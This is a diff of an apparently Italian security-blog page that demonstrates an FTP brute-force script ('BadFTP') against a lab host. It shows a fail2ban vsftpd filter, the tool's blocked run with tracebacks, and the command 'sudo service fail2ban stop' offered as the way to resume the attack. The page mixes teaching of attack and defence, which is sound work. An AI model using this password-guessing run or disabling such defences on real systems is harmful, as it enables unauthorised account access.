-  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 36, in is_correct
-    server.connect<span style="color:#f92672">(</span>host, port, timeout<span style="color:#f92672">=</span>5<span style="color:#f92672">)</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/ftplib.py&#34;</span>, line 158, in connect
-    self.sock <span style="color:#f92672">=</span> socket.create_connection<span style="color:#f92672">((</span>self.host, self.port<span style="color:#f92672">)</span>, self.timeout,
-                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 851, in create_connection
-    raise exceptions<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 836, in create_connection
-    sock.connect<span style="color:#f92672">(</span>sa<span style="color:#f92672">)</span>
-ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
-</code></pre></div><p>Come possiamo notare, veniamo bloccati da fail2ban, disattivandolo con:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo service fail2ban stop
-</code></pre></div><p>Saremo di nuovo in grado di utilizzare lo script. Nella cybersecurity è fondamentale capire sia come sfruttare vulnerabilità dei sistemi, dei protocolli di rete o in snippet di codice che fanno parte di un software, ma è altrettanto fondamentale capire come difendere questi sistemi.</p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Fail2Ban filter for vsftp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configure VSFTP for &#34;dual_log_enable=YES&#34;, and have fail2ban watch</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /var/log/vsftpd.log instead of /var/log/secure. vsftpd.log file shows the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># incoming ip address rather than domain names.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>INCLUDES<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>before <span style="color:#f92672">=</span> common.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Definition<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__pam_re<span style="color:#f92672">=</span><span style="color:#ae81ff">\(</span>?%<span style="color:#f92672">(</span>__pam_auth<span style="color:#f92672">)</span>s<span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\(\S</span>+<span style="color:#ae81ff">\)</span><span style="color:#f92672">)</span>?<span style="color:#ae81ff">\)</span>?:?
+</span></span><span style="display:flex;"><span>_daemon <span style="color:#f92672">=</span>  vsftpd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>failregex <span style="color:#f92672">=</span> ^%<span style="color:#f92672">(</span>__prefix_line<span style="color:#f92672">)</span>s%<span style="color:#f92672">(</span>__pam_re<span style="color:#f92672">)</span>s<span style="color:#ae81ff">\s</span>+authentication failure; logname<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* uid<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* euid<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* tty<span style="color:#f92672">=(</span>ftp<span style="color:#f92672">)</span>? ruser<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* rhost<span style="color:#f92672">=</span>&lt;HOST&gt;<span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\s</span>+user<span style="color:#f92672">=</span>.*<span style="color:#f92672">)</span>?<span style="color:#ae81ff">\s</span>*$
+</span></span><span style="display:flex;"><span>            ^ <span style="color:#ae81ff">\[</span>pid <span style="color:#ae81ff">\d</span>+<span style="color:#ae81ff">\]</span> <span style="color:#ae81ff">\[</span><span style="color:#f92672">[</span>^<span style="color:#ae81ff">\]</span><span style="color:#f92672">]</span>+<span style="color:#ae81ff">\]</span> FAIL LOGIN: Client <span style="color:#e6db74">&#34;&lt;HOST&gt;&#34;</span><span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\s</span>*$|,<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ignoreregex <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Author: Cyril Jaquier</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Documentation from fail2ban wiki</span>
+</span></span></code></pre></div><p>Dopo aver configurato Fail2ban e il filtro vsftpd, riavvia il servizio per applicare le modifiche:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo service fail2ban restart
+</span></span></code></pre></div><p>In alcuni casi può essere necessario anche avviare il servizio fail2ban, per farlo usiamo il comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo service fail2ban start
+</span></span></code></pre></div><p>Ora, proviamo ad eseguire di nuovo BadFTP e vediamo cosa accade:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt 
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>     _____       _ _____ _____ _____ 
+</span></span><span style="display:flex;"><span>    | __  |___ _| |   __|_   _|  _  |
+</span></span><span style="display:flex;"><span>    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
+</span></span><span style="display:flex;"><span>    |_____|__,|___|__|    |_| |__|   
+</span></span><span style="display:flex;"><span>                                 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The FTP server at <span style="color:#f92672">[</span> 192.168.1.77 <span style="color:#f92672">]</span> does not allow anonymous access or is unreachable.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Passwords to try: <span style="color:#ae81ff">47</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying password
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying catException in thread Thread-2 <span style="color:#f92672">(</span>password_checker<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 1038, in _bootstrap_inner
+</span></span><span style="display:flex;"><span>    self.run<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 975, in run
+</span></span><span style="display:flex;"><span>    self._target<span style="color:#f92672">(</span>*self._args, **self._kwargs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 63, in password_checker
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> is_correct<span style="color:#f92672">(</span>username, password<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 36, in is_correct
+</span></span><span style="display:flex;"><span>    server.connect<span style="color:#f92672">(</span>host, port, timeout<span style="color:#f92672">=</span>5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/ftplib.py&#34;</span>, line 158, in connect
+</span></span><span style="display:flex;"><span>    self.sock <span style="color:#f92672">=</span> socket.create_connection<span style="color:#f92672">((</span>self.host, self.port<span style="color:#f92672">)</span>, self.timeout,
+</span></span><span style="display:flex;"><span>                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 851, in create_connection
+</span></span><span style="display:flex;"><span>    raise exceptions<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 836, in create_connection
+</span></span><span style="display:flex;"><span>    sock.connect<span style="color:#f92672">(</span>sa<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span>Exception in thread Thread-1 <span style="color:#f92672">(</span>password_checker<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 1038, in _bootstrap_inner
+</span></span><span style="display:flex;"><span>    self.run<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 975, in run
+</span></span><span style="display:flex;"><span>    self._target<span style="color:#f92672">(</span>*self._args, **self._kwargs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 63, in password_checker
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> is_correct<span style="color:#f92672">(</span>username, password<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 36, in is_correct
+</span></span><span style="display:flex;"><span>    server.connect<span style="color:#f92672">(</span>host, port, timeout<span style="color:#f92672">=</span>5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/ftplib.py&#34;</span>, line 158, in connect
+</span></span><span style="display:flex;"><span>    self.sock <span style="color:#f92672">=</span> socket.create_connection<span style="color:#f92672">((</span>self.host, self.port<span style="color:#f92672">)</span>, self.timeout,
+</span></span><span style="display:flex;"><span>                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 851, in create_connection
+</span></span><span style="display:flex;"><span>    raise exceptions<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 836, in create_connection
+</span></span><span style="display:flex;"><span>    sock.connect<span style="color:#f92672">(</span>sa<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span></code></pre></div><p>Come possiamo notare, veniamo bloccati da fail2ban, disattivandolo con:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo service fail2ban stop
+</span></span></code></pre></div><p>Saremo di nuovo in grado di utilizzare lo script. Nella cybersecurity è fondamentale capire sia come sfruttare vulnerabilità dei sistemi, dei protocolli di rete o in snippet di codice che fanno parte di un software, ma è altrettanto fondamentale capire come difendere questi sistemi.</p>
       </div></div>
 
   
@@ -546,11 +565,6 @@ ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style
     <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
   </div>
 </footer>
 
@@ -559,7 +573,7 @@ ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style
 
 
 
-<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/SpaceHack/bundle.min.js"></script>
 
 
 
